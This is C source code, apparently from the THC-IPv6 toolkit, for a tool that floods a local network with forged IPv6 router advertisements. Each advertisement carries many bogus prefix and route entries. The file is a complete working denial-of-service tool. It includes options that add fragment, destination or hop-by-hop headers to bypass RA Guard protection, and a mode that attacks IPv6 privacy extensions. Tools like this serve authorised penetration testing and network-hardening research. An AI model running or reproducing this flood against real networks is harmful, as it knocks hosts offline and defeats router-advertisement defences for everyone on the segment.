#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <time.h>
#include <pcap.h>
#include "thc-ipv6.h"

#define ENTRIES 17

void help(char *prg) {
  printf("%s %s (c) 2012 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
  printf("Syntax: %s [-HFDRP] interface\n\n", prg);
  printf("Flood the local network with router advertisements.\n");
  printf("Each packet contains %d prefix and route enries\n", ENTRIES);
  printf("-F/-D/-H add fragment/destination/hopbyhop header to bypass RA guard security.\n");
  printf("-R does only send routing entries, no prefix information.\n");
  printf("-P does only send prefix information, no routing entries.\n");
  printf("-A is like -P but implements an attack by George Kargiotakis to disable privacy extensions\n");
//  printf("Use -r to use raw mode.\n\n");
  exit(-1);
}

int main(int argc, char *argv[]) {
  char *interface, mac[6] = "";
  unsigned char *mac6 = mac, *ip6;
  unsigned char buf[1460], buf2[6], buf3[1504];
  unsigned char *dst = thc_resolve6("ff02::1"), *dstmac = thc_get_multicast_mac(dst);
  int size, mtu, i, j, k, type = NXT_ICMP6, route_only = 0, prefix_only = 0, offset = 14;
  unsigned char *pkt = NULL;
  int pkt_len = 0, rawmode = 0, count = 0, deanon = 0, do_hop = 0, do_frag = 0, do_dst = 0;
  int cnt = ENTRIES, until = 0;
  thc_ipv6_hdr *hdr = NULL;

  if (argc < 2 || strncmp(argv[1], "-h", 2) == 0)
    help(argv[0]);

  while ((i = getopt(argc, argv, "DFHRPAr")) >= 0) {
    switch (i) {
    case 'r':
      thc_ipv6_rawmode(1);
      rawmode = 1;
      break;
    case 'A':
      deanon = 1;
      prefix_only = 1;
      cnt = 5;
      until = 256;
      break;
    case 'F':
      do_frag++;
      break;
    case 'H':
      do_hop = 1;
      break;
    case 'D':
      do_dst = 1;
      break;
    case 'R':
      route_only = 1;
      cnt += ENTRIES;
      break;
    case 'P':
      prefix_only = 1;
      cnt += ENTRIES;
      break;
    default:
      fprintf(stderr, "Error: invalid option %c\n", i);
      exit(-1);
    }
  }

  if (argc - optind < 1)
    help(argv[0]);

  srand(time(NULL) + getpid());
  setvbuf(stdout, NULL, _IONBF, 0);

  interface = argv[optind];
  mtu = 1500;
  size = 64;
  k = rand();
  ip6 = malloc(16);
  memset(ip6, 0, 16);
  ip6[0] = 254;
  ip6[1] = 128;
  ip6[9] = ( k % 65536) / 256;
  ip6[10] = k % 256;
  ip6[15] = 1;
  k++;
  if (do_hdr_size)
    offset = do_hdr_size;

  memset(buf2, 0, sizeof(buf2));
  memset(buf3, 0, sizeof(buf3));
  memset(buf, 0, sizeof(buf));
  buf[1] = 250;
  buf[5] = 30;
  buf[8] = 5; // mtu
  buf[9] = 1;
  buf[12] = mtu / 16777216;
  buf[13] = (mtu % 16777216) / 65536;
  buf[14] = (mtu % 65536) / 256;
  buf[15] = mtu % 256;
  buf[16] = 1; // mac
  buf[17] = 1;
  // 18-23 = mac address
  buf[19] = 12;
  j = 24;
  if (route_only == 0) {
    for (i = 0; i < cnt; i++) { // prefix
      buf[j] = 3; // prefix
      buf[j+1] = 4;
      buf[j+2] = size;
      buf[j+3] = 128 + 64 + 32;
      buf[j+5] = 2;
      buf[j+9] = 1;
//      memset(&buf[j+16], 255, 8);
      if (deanon) {
        buf[j+16] = 0xfd;
        buf[j+17] = 0x00;
      } else {
        buf[j+16] = 0x20;
        buf[j+17] = 0x12;
      }
      buf[j+18] = (k % 65536) / 256;
      buf[j+19] = k % 256;
      j += 32;
      k++;
    }
  }
  if (prefix_only == 0) {
    for (i = 0; i < cnt; i++) {  // route
      buf[j] = 24;
      buf[j+1] = 3;
      buf[j+2] = size;
      buf[j+3] = 8;
      buf[j+5] = 1; // 4-7 lifetime
//      memset(&buf[j+8], 255, 8);
      buf[j+8] = 32;
      buf[j+9] = 4;
      buf[j+10] = k / 256;
      buf[j+11] = k % 256;
      j += 24;
      k++;
    }
  }
  
  printf("Starting to flood network with router advertisements on %s (Press Control-C to end, a dot is printed for every 100 packet):\n", interface);
  while (until != 1) {
    memcpy(&buf[20], (char*)&k, 4);
    memcpy(ip6 + 11, (char*)&k, 4);
    k++;
    for (i = 0; i < cnt; i++) {
      if (route_only == 0)
        memcpy(&buf[24 + 20 + i*32], (char*)&k, 4);
      k++;
      if (prefix_only == 0)
        if (route_only == 0)
          memcpy(&buf[24 + 12 + i*24 + cnt*32], (char*)&k, 4);
        else
          memcpy(&buf[24 + 12 + i*24], (char*)&k, 4);
      k++;
    }
    count++;
    if ((pkt = thc_create_ipv6(interface, PREFER_LINK, &pkt_len, ip6, dst, 255, 0, 0, 0, 0)) == NULL)
      return -1;
    if (do_hop) {
      type = NXT_HBH;
      if (thc_add_hdr_hopbyhop(pkt, &pkt_len, buf2, sizeof(buf2)) < 0)
        return -1;
    }
    if (do_frag) {
      if (type == NXT_ICMP6)
        type = NXT_FRAG;
      for (i = 0; i < do_frag; i++)
        if (thc_add_hdr_oneshotfragment(pkt, &pkt_len, count + i) < 0)
          return -1;
    }
    if (do_dst) {
      if (type == NXT_ICMP6)
        type = NXT_DST;
      if (thc_add_hdr_dst(pkt, &pkt_len, buf3, sizeof(buf3)) < 0)
        return -1;
    }
    if (thc_add_icmp6(pkt, &pkt_len, ICMP6_ROUTERADV, 0, 0xff08ffff, buf, j, 0) < 0)
      return -1;
    if (do_dst) {
      thc_generate_pkt(interface, mac6, dstmac, pkt, &pkt_len);
      hdr = (thc_ipv6_hdr *) pkt;
      thc_send_as_fragment6(interface, ip6, dst, type, hdr->pkt + 40 + offset, hdr->pkt_len - 40 - offset, 1240);
    } else {
      if (thc_generate_and_send_pkt(interface, mac6, dstmac, pkt, &pkt_len) < 0) {
        printf("!");
      }
    }

    pkt = thc_destroy_packet(pkt);
//    usleep(1);
    if (count % 100 == 0)
      printf(".");
    if (until > 1)
      until--;
  }

  if (deanon)
    printf("\nPrivacy extension attack done.\n");
  
  return 0;
}
